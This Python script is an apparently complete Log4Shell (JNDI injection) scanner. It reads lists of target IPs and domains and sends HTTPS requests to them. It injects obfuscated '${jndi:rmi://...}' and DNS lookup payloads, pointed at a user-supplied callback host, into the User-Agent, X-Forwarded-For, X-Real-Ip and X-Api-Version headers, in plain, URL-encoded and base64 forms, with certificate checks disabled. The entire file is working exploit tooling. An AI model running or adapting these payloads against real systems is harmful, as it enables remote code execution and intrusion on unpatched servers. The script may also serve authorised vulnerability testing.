import argparse
import base64
from typing_extensions import Required
import requests
import random
import string
import re
from urllib import parse as urlparse
from urllib.parse import quote_plus


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

argparser = argparse.ArgumentParser()

input_group = argparser.add_mutually_exclusive_group(required=True)
input_group.add_argument("-f", "--file", dest="input_file", help="Input file. Should be in two columns. Ip,domain|domain|domain\\n format.", action='store')
input_group.add_argument("-u", "--url", dest="input_url", help="Test against a single URL (-ut/--url-target required as well)", action='store')
argparser.add_argument("-ut", "--url-target", dest="url_target", help="If testing a single url, this is required to specify the target IP of the request, -u/--url required.", action='store')
argparser.add_argument("-ud", "--url-domain", dest="url_domain", help="If testing a single url, this is required to specify the target domain of the request, -u/--url required.", action='store')
argparser.add_argument("-ua", "--useragent", dest="useragent", help="Specify the user agent", action='store')
argparser.add_argument("-c", "--callback", dest="callback", required=True, help="Request Callback", action='store')
argparser.add_argument("-d", "--dry-run", dest="dryrun", help="Run it with making requests to ensure it will generate the requests correctly.", action='store_true')
argparser.add_argument("-v", "--verbose", dest="verbose", help="Show info like headers", action='store_true')
argparser.add_argument("--exclude-ua", dest="exclude_ua", help="Exclude user agent from fuzzing.", action='store_true')

args = argparser.parse_args()

encode_types = 3

payloads = 	["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
			"${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
			"${jndi:rmi://{{callback_host}}}",
			"${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
			"${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
			"${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
			"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
			"${jndi:dns://{{callback_host}}}"]

target_headers = []
current_ip = ""

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"

timeout = 30


def parse_targets():
	return_list = []
	try:
		with open(args.input_file, 'r') as f:
			for i in f.readlines():
				if ( re.match(r'^\d+', i) ):
					temp = i.replace('\n', '')
					new_entry = ["",[]]
					split =  temp.split(',')
					## the first part of the array contains the IP
					new_entry[0] = split[0]
					## nested array contains the split domains
					for x in split[1].split('|'):
						if (not x.startswith("*") and not x == "No-Domains-Returned"):
							new_entry[1].append(x)
					return_list.append(new_entry)
		return return_list		
	except Exception as x:
		print(f"[!] Unable to read file: {args.input_file}! Error: {x}")
		exit(0)

def generate_random():
	return ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=6))

def get_public_ip():
	global current_ip
	current_ip = requests.get('http://ipinfo.io/json').json()['ip']
	if args.verbose : print(f"[+] [VERBOSE] IP Found: {current_ip}")
	

def generate_payload_string(payload, type=0):
	rand = generate_random()
	new_payload = payload
	new_payload = new_payload.replace('{{callback_host}}', args.callback)
	new_payload = new_payload.replace('{{random}}', rand)

	## Type 0 (default) = Plaintext
	## Type 1 = urlencode
	## Type 2 = base64encode
	if type == 1:
		new_payload = quote_plus(new_payload)
	elif type == 2:
		temp = new_payload
		temp_bytes = temp.encode('ascii')
		temp_b64_bytes = base64.urlsafe_b64encode(temp_bytes)
		new_payload = temp_b64_bytes.decode('ascii')
	
	return new_payload


def generate_headers(target, payload):
	ua_string = ua if args.exclude_ua else f"{ua} {payload}"
	return_headers = {"Host": target,
					"X-Forwarded-For": f"{current_ip} {payload}",
					"X-Real-Ip": f"{current_ip} {payload}",
					"Referer": f"https://{target}/",
					"X-Api-Version": f"1.0 {payload}",
					"User-Agent": ua_string}
	return return_headers
	

def send_request(target, path="/"):
	## iterate over the target ip's domains
	for x in target[1]:
		## iterate over the payloads for each domain
		for y in payloads:
			for z in range(0, encode_types):
				payload_string = generate_payload_string(y, z)
				try:
					test = True
					headers = generate_headers(x, payload_string)
					target_url = f"https://{target[0]}{path}"
					print(f"[+] Request: {target_url} ({x}) [ '{payload_string}' ]")
					if args.verbose : print(f"[+] [VERBOSE] Request Headers: {headers}")
					if not args.dryrun: 
						requests.request(url = target_url,
										method="GET",
										headers=headers,
										verify=False,
										timeout=timeout)
					else:
						print("[+] Dry Run...")
					
				except Exception as e:
					print(f"[!] Request Failed: {target_url} ({x}) [{payload_string}]| Error: {e}")

def main():
	if (args.input_url and not (args.url_target or args.url_domain)):
		print("[!] -ut/--url-target AND -ud/--url-domain is required with -u. Use --help for more info.")
		exit(0)
	if ((args.url_target or args.url_domain) and ((not args.input_url) or (not args.url_domain) or args.input_file)):
		print("[!] If targeting a single url, -u/--url AND -ut/--url-target AND -ud/--url-domain are required! Use --help for more info.")
		exit(0)
	
	if (args.useragent):
		ua = args.useragent

	if args.input_url:
		get_public_ip()
		send_request([args.url_target, [args.url_domain]], args.input_url)
	else:
		request_targets = parse_targets()
		get_public_ip()
		for x in request_targets:
			send_request(x)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
